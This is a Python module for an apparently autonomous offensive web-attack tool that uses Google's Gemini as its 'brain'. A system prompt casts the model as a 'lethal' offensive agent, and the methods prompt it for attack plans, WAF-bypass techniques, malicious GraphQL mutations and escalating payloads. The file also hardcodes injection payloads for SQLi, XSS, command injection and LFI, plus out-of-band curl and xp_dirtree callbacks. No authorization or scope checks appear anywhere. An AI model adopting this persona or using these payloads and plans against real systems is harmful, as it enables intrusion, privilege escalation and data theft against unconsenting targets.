import logging
from google import genai
from aura.core import state

logger = logging.getLogger("aura")

class AuraBrain:
    """The 'Sentient' intelligence layer powered by Gemini for strategic offensive reasoning."""
    
    SYSTEM_PROMPT = (
        "You are AURA-Zenith Singularity, the ultimate autonomous offensive AI agent. "
        "Your mission is to perform deep, chain-of-thought (CoT) security analysis. "
        "You don't just fuzz inputs; you intercept network traffic, analyze DOM structures, "
        "and identify complex logic flaws (BOLA, IDOR, Privilege Escalation). "
        "You maintain tactical memory of all probes to refine your strategy iteratively. "
        "When generating payloads, you provide 3 levels of escalation, including Ghost v6 fragmented evasion. "
        "Respond ONLY in requested formats. Always be technical, concise, and lethal."
    )

    REASONING_PATTERNS = {
        "admin": "Administrative panels are entry points for lateral movement and credential harvesting. Recommendation: Brute-force discovery of sub-directories (/admin, /wp-admin) or check for default credentials.",
        "jenkins": "Jenkins instances often contain CI/CD secrets and SSH keys. If accessed, it could lead to a full Supply Chain compromise.",
        "api": "Unprotected APIs often suffer from Broken Object Level Authorization (BOLA). Recommendation: Fuzz endpoints for IDOR vulnerabilities.",
        "staging": "Staging environments are often less protected than production and may contain legacy data or debug symbols.",
        "docker": "Exposed Docker registries or sockets can lead to container escape and host takeover.",
        "vpn": "VPN endpoints are high-value targets for initial access. Recommendation: Check for known CVEs in the underlying software (Pulse Secure, Fortinet, etc.)."
    }

    def __init__(self):
        self.enabled = False
        self.tactical_memory = [] # Phase 18: Tactical Memory
        self.payload_cache = {}  # Initialize payload cache for Level 1 & 2
        if state.GEMINI_API_KEY:
            try:
                self.client = genai.Client(api_key=state.GEMINI_API_KEY)
                self.enabled = True
                logger.info("AuraBrain Singularity: Gemini Engine online (SDK v1).")
            except Exception as e:
                logger.error(f"AuraBrain: Failed to initialize Gemini: {e}")

    def autonomous_plan(self, url: str, dom_context: str, network_context: list) -> dict:
        """Ghost v6: Autonomous Chain-of-Thought planning based on real-time interception."""
        if not self.enabled: return {"plan": "Standard Fuzzing", "reasoning": "AI Offline"}
        
        prompt = (
            f"As AURA Singularity, analyze the current state of {url}.\n"
            f"DOM Context (Snippet): {dom_context[:1500]}\n"
            f"Intercepted Network Requests: {network_context[:10]}\n"
            f"Tactical Memory (Past Actions): {self.tactical_memory[-5:]}\n\n"
            "Develop a Chain-of-Thought attack plan. Focus on: \n"
            "1. Hidden API endpoints with weak auth.\n"
            "2. Complex logic flows or multi-step bypasses.\n"
            "3. Sensitive data exposure in JS or headers.\n\n"
            "Respond ONLY in JSON: {'plan': 'detailed string', 'target_vector': 'string', 'reasoning': 'string'}"
        )
        try:
            response = self.client.models.generate_content(
                model=state.GEMINI_MODEL,
                contents=prompt,
                config={'system_instruction': self.SYSTEM_PROMPT}
            )
            import json
            raw = response.text.strip().replace("```json", "").replace("```", "")
            plan = json.loads(raw)
            self.tactical_memory.append(f"Planned: {plan.get('target_vector')}")
            return plan
        except Exception as e:
            logger.error(f"AuraBrain CoT: {e}")
            return {"plan": "Fallback Recon", "target_vector": "Unknown"}

    def reason(self, target_context: dict) -> str:
        """Analyzes a target and provides strategic advice using AI or fallback rules."""
        target_value = target_context.get("target", "").lower()
        
        if self.enabled:
            try:
                prompt = (
                    f"Analyze this target context and generate a strategic offensive 'Battle Plan'.\n"
                    f"Context: {target_context}\n"
                    "Focus on specific attack vectors based on the tech stack and risk score.\n"
                    "Provide concise actionable recommendations."
                )
                response = self.client.models.generate_content(
                    model=state.GEMINI_MODEL,
                    contents=prompt,
                    config={'system_instruction': self.SYSTEM_PROMPT}
                )
                return response.text
            except Exception as e:
                logger.warning(f"AuraBrain: Gemini query failed, falling back to rules. Error: {e}")

        insights = []
        for pattern, explanation in self.REASONING_PATTERNS.items():
            if pattern in target_value:
                insights.append(explanation)

        if not insights:
            return "General reconnaissance target. Recommendation: Perform port scanning and service enumeration to identify potential attack surface."
        
        return "\n\n".join(insights)

    def reason_json(self, prompt: str, system_instruction: str = None) -> str:
        """New v5.1: Specialized reasoning for structured JSON data with strict enforcement."""
        if not self.enabled: return "[]"
        
        try:
            response = self.client.models.generate_content(
                model=state.GEMINI_MODEL,
                contents=prompt,
                config={'system_instruction': system_instruction or self.SYSTEM_PROMPT}
            )
            raw = response.text.strip().replace("```json", "").replace("```", "").strip()
            # Basic validation: must start with [ or {
            if raw.startswith("[") or raw.startswith("{"):
                return raw
            return "[]"
        except Exception as e:
            logger.error(f"AuraBrain JSON Reason: {e}")
            return "[]"

    def analyze_behavior(self, url: str, payload: str, delay_ms: int, length: int, status: int, body: str) -> dict:
        """Deep behavioral analysis for Blind vulnerabilities and WAF evasion indicators."""
        if not self.enabled: return {"vulnerable": False}
        
        prompt = (
            f"As a Red Team AI, analyze this response behavior for a payload: '{payload}' on {url}.\n"
            f"Observed Latency: {delay_ms}ms | Content Length: {length} | Status: {status}\n"
            f"Response Snippet:\n{body[:1000]}\n\n"
            "Is there any suspicious behavior? High latency (>3s) often indicates Blind SQLi or Command Injection. "
            "Structural changes (Length delta > 500) indicate potential bypass or information leak. "
            "Respond ONLY in JSON: {'vulnerable': boolean, 'suspect': boolean, 'type': 'string', 'confidence': 'string', 'reason': 'string'}"
        )
        try:
            response = self.client.models.generate_content(
                model=state.GEMINI_MODEL,
                contents=prompt,
                config={'system_instruction': self.SYSTEM_PROMPT}
            )
            import json
            raw = response.text.strip().replace("```json", "").replace("```", "")
            return json.loads(raw)
        except Exception as e:
            logger.error(f"AuraBrain Behavior: {e}")
            return {"vulnerable": False}

    def analyze_parameter_semantics(self, parameters: dict) -> list:
        """Phase 27: Analyzes parameter keys and values to suggest business logic attacks."""
        if not self.enabled or not parameters: return []
        
        prompt = (
            f"As AURA Singularity, analyze these HTTP parameters for business logic flaws (IDOR, BOLA, Privilege Escalation, Price Manipulation).\n"
            f"Parameters: {parameters}\n\n"
            "Identify parameters that look like IDs, roles, prices, permissions, or boolean flags. "
            "Suggest 1-3 specific manipulations to bypass logic or escalate privileges. "
            "Respond ONLY in JSON array: [{'parameter': 'name', 'payload': 'value', 'type': 'Logic Injection', 'reason': 'string'}]"
        )
        try:
            response = self.client.models.generate_content(
                model=state.GEMINI_MODEL,
                contents=prompt,
                config={'system_instruction': self.SYSTEM_PROMPT}
            )
            import json
            raw = response.text.strip().replace("```json", "").replace("```", "")
            return json.loads(raw)
        except Exception as e:
            logger.error(f"AuraBrain Semantics: {e}")
            return []

    def suggest_waf_evasion(self, waf_type: str) -> str:
        """Phase 28: GPT-driven recommendation for bypassing specific WAFs."""
        if not self.enabled: return "Use standard URL encoding."
        
        prompt = (
            f"As AURA Singularity, recommend a technical evasion technique to bypass {waf_type} WAF.\n"
            "Focus on: encoding (double URL, unicode), whitespace manipulation, comment nesting (SQL), or header smuggling. "
            "Provide 1-2 sentences of technical guidance."
        )
        try:
            response = self.client.models.generate_content(
                model=state.GEMINI_MODEL,
                contents=prompt,
                config={'system_instruction': self.SYSTEM_PROMPT}
            )
            return response.text.strip()
        except Exception as e:
            logger.error(f"AuraBrain Evasion: {e}")
            return "Use polymorphism and fragmented payloads."

    def generate_graphql_attack(self, schema: str) -> str:
        """Phase 30: AI-driven GraphQL mutation fuzzing based on schema analysis."""
        if not self.enabled: return 'mutation { login(user: "admin", pass: "' + "' OR 1=1--" + '") { token } }'
        
        prompt = (
            f"As AURA Singularity, analyze this GraphQL schema and generate a malicious mutation or query.\n"
            f"Schema Fragment: {schema[:2000]}\n\n"
            "Identify sensitive mutations like 'updateUser', 'resetPassword', 'deleteRecord', 'transfer'. "
            "Generate a 'lethal' GraphQL payload to exploit potential logic flaws or injection.\n"
            "Return ONLY the raw GraphQL string."
        )
        try:
            response = self.client.models.generate_content(
                model=state.GEMINI_MODEL,
                contents=prompt,
                config={'system_instruction': self.SYSTEM_PROMPT}
            )
            return response.text.strip().replace("```graphql", "").replace("```", "")
        except Exception as e:
            logger.error(f"AuraBrain GraphQL: {e}")
            return 'mutation { login(user: "admin") { token } }'

    def is_input_relevant(self, name: str, vuln_type: str) -> bool:
        """Phase 30: Heuristic check to see if an input name is relevant for a vuln type."""
        name = name.lower()
        irrelevant_sql = ["color", "width", "height", "font", "theme", "css", "style"]
        if vuln_type == "SQLi" and any(x in name for x in irrelevant_sql):
            return False
            
        irrelevant_xss = ["token", "uuid", "timestamp", "date"]
        # Note: 'id' might be vulnerable to IDOR but here we check for XSS reflection
        if vuln_type == "XSS" and any(x == name for x in irrelevant_xss):
            return False
            
        return True

    def calculate_impact(self, finding_type: str, content: str) -> str:
        """Phase 31: Analyzes a finding to determine professional severity."""
        content_low = content.lower()
        type_low = finding_type.lower()
        
        # 1. AI-Driven deep reasoning (if available)
        if self.enabled:
            # We use a summarized prompt for speed
            prompt = (
                f"As AURA Singularity, analyze this security finding and assign a professional severity: CRITICAL, HIGH, MEDIUM, or LOW.\n"
                f"Finding Type: {finding_type}\n"
                f"Finding Content: {content}\n\n"
                "Return ONLY the severity name."
            )
            try:
                response = self.client.models.generate_content(
                    model=state.GEMINI_MODEL,
                    contents=prompt,
                    config={'count': 1}
                )
                res = response.text.strip().upper()
                if res in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
                    return res
            except: pass

        # 2. Heuristic Fallback (Logical/Deterministic rules)
        high_impact_paths = [
            "/backup", "/db", "/phpmyadmin", "/config", "/setup", "/.env", "/settings", 
            "/admin", "/login", "/mysql", "/sql", "/backup.zip", "/config.php", "/web.config",
            "/.git", "/.svn", "/.ds_store", "/dvwa", "/vuln", "/test", "/dev"
        ]
        
        # If any high-impact keyword is in the content/path and it's info disclosure or discovered path
        if "path" in type_low or "disclosure" in type_low or "discovered" in type_low:
            if any(path in content_low for path in high_impact_paths):
                return "CRITICAL"
        
        # Injection and high-impact vulns
        if any(x in type_low for x in ["injection", "rce", "ssrf", "idor", "lfi"]):
            return "CRITICAL"
            
        if any(x in type_low for x in ["xss", "secret", "token", "key", "access", "auth"]):
            return "HIGH"
            
        return "MEDIUM"

    def generate_payload(self, vuln_type: str, tech_stack: str, level: int = 2, oast_url: str = None) -> str:
        """Generates a site-specific bypass payload. Supports Phase 26 OAST Blind Exploitation."""
        if not self.enabled: return "' OR 1=1--"
        
        cache_key = f"{vuln_type}:{tech_stack}:{level}:{'oast' if oast_url else 'no_oast'}"
        if level < 3 and cache_key in self.payload_cache:
            return self.payload_cache[cache_key]

        if level == 1:
            basics = {
                "SQLi": "' OR 1=1--",
                "XSS": "<script>alert(1)</script>",
                "Command Injection": "; id",
                "Local File Inclusion": "../../../../etc/passwd",
                "Server-Side Request Forgery": "http://127.0.0.1:80"
            }
            if oast_url:
                oast_domain = oast_url.replace('https://', '').replace('http://', '').strip('/')
                oast_basics = {
                    "Command Injection": f"; curl {oast_url} -sO",
                    "Server-Side Request Forgery": f"{oast_url}",
                    "Local File Inclusion": f"{oast_url}",
                    "SQLi": f"'; EXEC master..xp_dirtree '\\\\{oast_domain}\\a';--",
                }
                payload = oast_basics.get(vuln_type, basics.get(vuln_type, "' OR 1=1--"))
            else:
                payload = basics.get(vuln_type, "' OR 1=1--")
                
            self.payload_cache[cache_key] = payload
            return payload

        descriptions = {
            1: "Generic probe (Low signal)",
            2: "Context-aware polymorphic (Medium evasion)",
            3: "Extreme WAF-Bypass (Double encoded, unicode splitting, multi-layered evasion)"
        }
        
        prompt = (
            f"Generate an EXTREME {vuln_type} payload targeting {tech_stack}.\n"
            f"Evasion Level: {level} ({descriptions.get(level)})\n"
        )
        
        if oast_url:
            prompt += (
                f"\n!!! CRITICAL PHASE 26 OAST INJECTION !!!\n"
                f"You MUST construct a BLIND EXPLOIT that forces the target server to make a network request (HTTP GET or DNS) to exactly: {oast_url}\n"
            )
            
        prompt += (
            "Guidelines for Level 2:\n"
            "- Use standard evasion techniques like URL encoding or Hex encoding.\n"
            "Guidelines for Level 3 (SINGULARITY MODE):\n"
            "- If SQLi: Use non-standard encodings, hex splitting, and site-specific timing triggers (e.g., pg_sleep).\n"
            "- If XSS: Use DOM-based evasion, alert triggers mapped to non-standard events (e.g., src=x onerror), svg/math payloads.\n"
            "- If Command Injection: Use out-of-band curl/wget piping, bash brace expansion, or environment variable manipulation.\n"
            "- If LFI/SSRF: Use wrapper streams (php://filter), null byte injection, or alternative IP representations (e.g., decimal IPs).\n"
            "- Focus on 'Zero-Day' style polymorphic bypasses that signatures cannot catch.\n"
            "Return ONLY the raw payload string without any backticks, tags or formatting. Be lethal."
        )
        try:
            response = self.client.models.generate_content(
                model=state.GEMINI_MODEL,
                contents=prompt,
                config={'system_instruction': self.SYSTEM_PROMPT}
            )
            payload = response.text.strip()
            if level < 3: self.payload_cache[cache_key] = payload
            return payload
        except Exception as e:
            logger.error(f"AuraBrain Generate: {e}")
            return "' OR 1=1--"
